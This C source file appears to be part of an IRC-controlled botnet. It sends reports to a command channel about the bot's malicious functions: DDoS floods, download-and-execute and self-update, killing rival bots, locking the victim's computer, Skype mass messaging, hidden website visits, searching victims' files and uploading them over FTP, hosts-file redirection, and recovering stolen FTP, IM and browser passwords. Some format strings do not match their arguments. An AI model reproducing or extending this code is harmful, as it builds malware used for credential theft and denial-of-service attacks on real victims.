#include "../Includes/includes.h"

//Encrypted Commands
#ifndef HTTP_BUILD
void SendEncryptedCommandFailed()
{
    sprintf(cSend, "%s %s :%s Encrypted Command: Failed to decrypt", cIrcCommandPrivmsg, cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}

//Shell command output
void SendShellCommandSubmitted(char *pcCommand)
{
    sprintf(cSend, "%s %s :%s Shell: Submitted [Command: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcCommand);
    SendToIrc(cSend);
}

//Website Status output
void SendWebsiteStatus(char *pcUrl, char *pcStatus)
{
    sprintf(cSend, "%s %s :%s Website Status [URL: %s | Result: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcUrl, pcStatus);
    SendToIrc(cSend);
}

#ifdef INCLUDE_FILESEARCH
//File search engine related
void SendFileSearchStopped(char *pcSearchParameter)
{
    sprintf(cSend, "%s %s :%s File Search: Stopped [Param: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcSearchParameter);
    SendToIrc(cSend);
}

void SendFailedToSearch()
{
    sprintf(cSend, "%s %s :%s File Search: Failed", cIrcCommandPrivmsg, cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}

void SendSearchAlreadyRunning()
{
    sprintf(cSend, "%s %s :%s File Search: Already Running", cIrcCommandPrivmsg, cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}

void SendFileSearchSuccess(unsigned long ulFilesSeached, unsigned long ulFileMatches, char *pcSearchParameter)
{
    sprintf(cSend, "%s %s :%s File Search: [Searched Files: %li | Matches: %li | Param: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, ulFilesSeached, ulFileMatches, pcSearchParameter);

    SendToIrc(cSend);
}

void SendSearchedFile(char *pcSearchParameter, char *cFile)
{
    sprintf(cSend, "%s %s :%s File Search: [File: %s | Param: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cFile, pcSearchParameter);

    SendToIrc(cSend);
}
#endif

#ifdef INCLUDE_DDOS
//Ddos related
void SendDdosResult(bool bResult, char *pcCommand, char *pcTargetUrl, unsigned short usTargetPort, DWORD dwAttackLength)
{
    if(bResult)
    {
        sprintf(cSend, "%s %s :%s Flood: Started [Type: %s | Host: %s | Port: ", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcCommand, pcTargetUrl);

        if(usTargetPort == 0)
            strcat(cSend, "random");
        else
        {
            char cPort[6];
            itoa(usTargetPort, cPort, 10);
            strcat(cSend, cPort);
        }

        strcat(cSend, " | ");

        char cAttackLength[6];
        itoa(dwAttackLength, cAttackLength, 10);
        strcat(cSend, cAttackLength);

        strcat(cSend, " seconds]");

        SendToIrc(cSend);
    }
    else
    {
        sprintf(cSend, "%s %s :%s Flood: Failed [Type: %s | Host: %s | Port: ", "%i | Length: %ld seconds]",
                cIrcCommandPrivmsg, cChannel, cIrcResponseErr, pcCommand, pcTargetUrl, usTargetPort, dwAttackLength);
        SendToIrc(cSend);
    }
}

void SendHttpDdosStop(bool bPacketAccountable, DWORD dwPackets, DWORD dwLength)
{
    if(bPacketAccountable)
        sprintf(cSend, "%s %s :%s HTTP Flood: Stopped [Total Packets: %ld | Rate: %ld Packets/Second]",
                cIrcCommandPrivmsg, cChannel, cIrcResponseOk, dwPackets, (dwPackets / dwLength));
    else
        sprintf(cSend, "%s %s :%s HTTP Flood: Stopped",
                cIrcCommandPrivmsg, cChannel, cIrcResponseOk);

    SendToIrc(cSend);
}

void SendSockDdosStop(bool bPacketAccountable, DWORD dwPacketsOrEstablishedConnections, DWORD dwLength)
{
    if(bPacketAccountable)
        sprintf(cSend, "%s %s :%s UDP Flood: Stopped [Total Packets: %ld | Rate: %ld Packets/Second]",
                cIrcCommandPrivmsg, cChannel, cIrcResponseOk, dwPacketsOrEstablishedConnections, (dwPacketsOrEstablishedConnections / dwLength));
    else
        sprintf(cSend, "%s %s :%s ECF Flood: Stopped [Total Connections: %ld | Rate: %ld Connections/Second]",
                cIrcCommandPrivmsg, cChannel, cIrcResponseOk, dwPacketsOrEstablishedConnections, (dwPacketsOrEstablishedConnections / dwLength));

    SendToIrc(cSend);
}

void SendBrowserDdosSuccess(char *cHost, DWORD dwLength, char *cBrowser)
{
    sprintf(cSend, "%s %s :%s Browser Based Flood: Started [Host: %s | Length: %ld seconds | Browser: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cHost, dwLength, cBrowser);
    SendToIrc(cSend);
}

void SendBrowserDdosStop(char *cHost)
{
    sprintf(cSend, "%s %s :%s Browser Based Flood: Stopped [Host: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cHost);
    SendToIrc(cSend);
}

void SendBrowserDdosFail(char *cHost)
{
    sprintf(cSend, "%s %s :%s Browser Based Flood: Failed [Host: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseErr, cHost);
    SendToIrc(cSend);
}
#endif

//Download, Execute, and Update related
void SendDownloadScheduleNotification(DWORD dwSeconds, char *cFileDownloadUrl, bool bUpdateToFile)
{
    if(bUpdateToFile)
        sprintf(cSend, "%s %s :%s Update Scheduled [File: %s | Wait Time: %ld Seconds]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cFileDownloadUrl, dwSeconds);
    else
        sprintf(cSend, "%s %s :%s Download and Execute Scheduled [File: %s | Wait Time: %ld Seconds]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cFileDownloadUrl, dwSeconds);
    SendToIrc(cSend);
}

void SendFailedToWrite(char *cFileDownloadUrl)
{
    sprintf(cSend, "%s %s :%s Download and Execute: Failed [File: %s] (Could not not open file for writing)",
            cIrcCommandPrivmsg, cChannel, cIrcResponseErr, cFileDownloadUrl);
    SendToIrc(cSend);
}

void SendDownloadAndExecuteSuccess(char *cFileDownloadUrl, char *szMd5)
{
    sprintf(cSend, "%s %s :%s Download and Execute: Success [File: %s | MD5: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cFileDownloadUrl, szMd5);
    SendToIrc(cSend);
}

void SendMd5NotMatch(char *szMd5_1, char *szMd5_2)
{
    sprintf(cSend, "%s %s :%s MD5 Mismatch [%s != %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseErr, szMd5_1, szMd5_2);
    SendToIrc(cSend);
}

void SendMd5MatchesCurrent(char *szMd5_1, char *szMd5_2)
{
    sprintf(cSend, "%s %s :%s MD5 Matches Current File [%s == %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseErr, szMd5_1, szMd5_2);
    SendToIrc(cSend);
}

void SendDownloadAndExecuteWithArgumentsSuccess(char *cFileDownloadUrl, char *cArguments, char *szMd5)
{
    sprintf(cSend, "%s %s :%s Download and Execute: Success [File: %s | MD5: %s | Args: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cFileDownloadUrl, szMd5, cArguments);
    SendToIrc(cSend);
}

void SendDownloadSuccessAndExecuteFail(char *cFileDownloadUrl, char *szMd5)
{
    sprintf(cSend, "%s %s :%s Download and Execute: Failed [File: %s | MD5: %s] (Download Succeeded | Execute Failed)",
            cIrcCommandPrivmsg, cChannel, cIrcResponseErr, cFileDownloadUrl, szMd5);
    SendToIrc(cSend);
}

void SendMd5Hash(char *szFileDownloadUrl, char *szMd5Hash)
{
    sprintf(cSend, "%s %s :%s MD5 Hash [File: %s | MD5: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, szFileDownloadUrl, szMd5Hash);
    SendToIrc(cSend);
}

void SendDownloadFail(char *cFileDownloadUrl)
{
    sprintf(cSend, "%s %s :%s Download and Execute: Failed [File: %s] (Download Failed)",
            cIrcCommandPrivmsg, cChannel, cIrcResponseErr, cFileDownloadUrl);
    SendToIrc(cSend);
}

void SendDownloadAbort(DWORD dwSeconds, char *cUrl)
{
    sprintf(cSend, "%s %s :%s Download and Execute: Aborted [File: %s | Remaining Time: %ld Seconds]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cUrl, dwSeconds);
    SendToIrc(cSend);
}

void UninstallForUpdate(char *szMd5)
{
    strcpy(cSend, "QUIT Updating to ");
    strcat(cSend, szMd5);
    SendToIrc(cSend);
}

#ifdef INCLUDE_BOTKILL
//Botkiller related
void SendBotkillerStarted()
{
    sprintf(cSend, "%s %s :%s Botkill: Started", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}

void SendBotkilledOneCycle(DWORD dwKills, DWORD dwFiles, DWORD dwKeys)
{
    sprintf(cSend, "%s %s :%s Botkill: Cycled once: [Killed Processes: %ld | File Modifications: %ld | Deleted Registry Keys: %ld]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, dwKills, dwFiles, dwKeys);
    SendToIrc(cSend);
}

void SendBotkillerStopped()
{
    sprintf(cSend, "%s %s :%s Botkill: Stopped", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}

void SendBotkillCount(DWORD dwKills, DWORD dwFiles, DWORD dwKeys)
{
    sprintf(cSend, "%s %s :%s Botkill: Counter: [Killed Processes: %ld | File Modifications: %ld | Deleted Registry Keys: %ld]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, dwKills, dwFiles, dwKeys);
    SendToIrc(cSend);
}

void SendBotkillCleared()
{
    sprintf(cSend, "%s %s :%s Botkill: Counter: Cleared", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}
#endif

#ifdef INCLUDE_LOCK
//Lock related
void SendComputerLocked()
{
    sprintf(cSend, "%s %s :%s Lock: Activated", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}

void SendComputerUnLocked()
{
    sprintf(cSend, "%s %s :%s Lock: Deactivated", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}
#endif

#ifdef INCLUDE_SKYPE_MASS_MESSENGER
//Skype Mass Messenger
void SendSkypeMessagesSent(int nSentMessages)
{
    sprintf(cSend, "%s %s :%s Skype Mass Messenger: Sent message to %i contacts", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, nSentMessages);
    SendToIrc(cSend);
}
#endif

#ifdef INCLUDE_VISIT
//Website visit related
void SendSimpleVisitSuccess(char *pcUrl, char *pcBrowser, bool bHidden)
{
    char cHiddenOrVisible[8];
    if(bHidden)
        strcpy(cHiddenOrVisible, "hidden");
    else
        strcpy(cHiddenOrVisible, "visible");

    sprintf(cSend, "%s %s :%s Visit: Success [URL: %s | Mode: %s | Browser: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcUrl, cHiddenOrVisible, pcBrowser);
    SendToIrc(cSend);
}

void SendWebsiteOpenFail(char *cUrl)
{
    sprintf(cSend, "%s %s :%s Visit: Failed [URL: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseErr, cUrl);
    SendToIrc(cSend);
}

void SendWebsiteOpenConfirmation(char *cBrowser, unsigned int uiSecondsBefore, unsigned int uiSecondsAfter, char *cUrl)
{
    sprintf(cSend, "%s %s :%s SmartView: Opened [URL: %s | Waited: %i Seconds | Closing In: %i Seconds | Browser: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cUrl, uiSecondsBefore, uiSecondsAfter, cBrowser);

    SendToIrc(cSend);
}

void SendWebsiteCloseConfirmation(unsigned int uiSeconds, char *cUrl)
{
    sprintf(cSend, "%s %s :%s SmartView: Closed [URL: %s | Waited: %i Seconds]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cUrl, uiSeconds);

    SendToIrc(cSend);
}

void SendWebsiteScheduleConfirmation(unsigned int uiSeconds, char *cUrl)
{
    sprintf(cSend, "%s %s :%s SmartView: Scheduled [URL: %s | Wait Time: %i Seconds]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cUrl, uiSeconds);

    SendToIrc(cSend);
}

void SendClearSmartViewQueue(unsigned int uiEntries)
{
    sprintf(cSend, "%s %s :%s SmartView: Cleared [Entries Cleared: %i]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, uiEntries);
    SendToIrc(cSend);
}

void SendDeletedEntry(char *cEntry)
{
    sprintf(cSend, "%s %s :%s SmartView: Deleted Entry [URL: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cEntry);
    SendToIrc(cSend);
}
#endif

#ifdef INCLUDE_FILESEARCH
//Ftp upload related
void SendFailedToOpenInternetConnection()
{
    sprintf(cSend, "%s %s :%s FTP Upload: Failed (Could not open an internet connection)", cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}

void SendSuccessfulFileUpload(char *cOriginalFile, char *cUploadedFile)
{
    sprintf(cSend, "%s %s :%s FTP Upload: Success [Original File: %s | New File: %s]",
            cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cOriginalFile, cUploadedFile);
    SendToIrc(cSend);
}

void SendFailedToFileUpload()
{
    sprintf(cSend, "%s %s :%s FTP Upload: Failed", cIrcCommandPrivmsg, cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}

void SendFailedToConnect()
{
    sprintf(cSend, "%s %s :%s FTP Upload: Failed (Could not connect)", cIrcCommandPrivmsg, cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}
#endif

//Misc
void SendThreadCreationFail()
{
    sprintf(cSend, "%s %s :%s Failed to Create Thread", cIrcCommandPrivmsg, cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}

void SendInvalidParameters()
{
    sprintf(cSend, "%s %s :%s Invalid Parameter(s)", cIrcCommandPrivmsg, cChannel, cIrcResponseErr);
    SendToIrc(cSend);
}

#ifdef INCLUDE_HOSTBLOCK
//Hosts file
void SendSuccessfullyRestoredHostsFile()
{
    sprintf(cSend, "%s %s :%s Hosts file restored", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}

void SendSuccessfullyBlockedHost(char *cHost)
{
    sprintf(cSend, "%s %s :%s Host Blocked [Param: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cHost);
    SendToIrc(cSend);
}

void SendSuccessfullyRedirectedHost(char *cOriginalHost, char *cRedirectToHost)
{
    sprintf(cSend, "%s %s :%s Host Redirected [Original: %s | Redirect: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, cOriginalHost, cRedirectToHost);
    SendToIrc(cSend);
}
#endif

#ifdef INCLUDE_RECOVERY
//Login output
void SendFtpLogins(char *pcClient, char *pcHost, char *pcUser, char*pcPass)
{
    sprintf(cSend, "%s %s :%s FTP Recovered: %s [Host: %s | User: %s | Pass: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcClient, pcHost, pcUser, pcPass);
    SendToIrc(cSend);
}

void SendImLogins(char *pcClient, char *pcUser, char*pcPass)
{
    sprintf(cSend, "%s %s :%s IM Recovered: %s [User: %s | Pass: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcClient, pcUser, pcPass);
    SendToIrc(cSend);
}

void SendBrowserLogins(char *pcClient, char *pcUrl, char *pcUser, char*pcPass)
{
    sprintf(cSend, "%s %s :%s Browser Recovered: %s [URL: %s | User: %s | Pass: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcClient, pcUrl, pcUser, pcPass);
    SendToIrc(cSend);
}
#endif

#ifdef INCLUDE_IRCWAR
//IRC War related
void SendSuccessfulStartedAttemptedRemoteIrcConnections(char *pcHost, DWORD dwPort)
{
    sprintf(cSend, "%s %s :%s IRC War: Connecting [Host: %s | Port: %ld]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcHost, dwPort);
    SendToIrc(cSend);
}

void SendDisconnectedFromRemoteIrcConnections(char *pcHost, DWORD dwPort)
{
    sprintf(cSend, "%s %s :%s IRC War: Disconnecting [Host: %s | Port: %ld]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcHost, dwPort);
    SendToIrc(cSend);
}

void SendSuccessfulWarSubmit(char *pcType)
{
    sprintf(cSend, "%s %s :%s IRC War: Command submitted [Type: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcType);
    SendToIrc(cSend);
}

void SendWarFloodStarted(char *pcType, char *pcTarget)
{
    sprintf(cSend, "%s %s :%s IRC War: Flood started [Type: %s | Target: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcType, pcTarget);
    SendToIrc(cSend);
}

void SendWarFloodStopped(char *pcType, char *pcTarget)
{
    sprintf(cSend, "%s %s :%s IRC War: Flood stopped [Type: %s | Target: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcType, pcTarget);
    SendToIrc(cSend);
}

void SendWarStatus(DWORD dwValidatedConnections, char *pcStatus)
{
    sprintf(cSend, "%s %s :%s IRC War: [Validated Connections: %ld | Status: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, dwValidatedConnections, pcStatus);
    SendToIrc(cSend);
}

void SendKillUser(char *pcTarget)
{
    sprintf(cSend, "%s %s :%s IRC War: Kill User [Target: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcTarget);
    SendToIrc(cSend);
}

void SendKillMultipleUsers(char *pcParam)
{
    sprintf(cSend, "%s %s :%s IRC War: Kill Multiple Users [Targets: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, pcParam);
    SendToIrc(cSend);
}

void SendKillMultipleUsersStop()
{
    sprintf(cSend, "%s %s :%s IRC War: Stopped Kill Multiple Users", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}

void SendSuccessfulRegisterNickname(DWORD dwSocket)
{
    sprintf(cSend, "%s %s :%s IRC War: Successfully registered with NickServ [Socket: %ld]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, dwSocket);
    SendToIrc(cSend);
}

void SendAbortRegisterNickname()
{
    sprintf(cSend, "%s %s :%s IRC War: Aborted registration with NickServ", cIrcCommandPrivmsg, cChannel, cIrcResponseOk);
    SendToIrc(cSend);
}
#endif
#endif
